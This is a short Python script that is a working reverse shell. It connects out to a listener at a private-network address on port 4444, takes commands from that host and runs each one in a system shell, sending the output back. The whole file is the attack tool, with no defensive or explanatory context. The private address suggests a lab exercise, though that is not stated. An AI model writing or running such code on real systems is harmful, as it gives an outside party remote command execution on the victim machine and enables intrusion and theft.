import socket
import subprocess
connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.40.156",4444))

while True:
	message="\n Enter your command here.... \n".encode("utf-8")
	connection.send(message)
	command=connection.recv(1024).decode("utf-8")
	result=subprocess.check_output(command,shell=True)
	#result is already a byte like object
	connection.send(result)

connection.close()
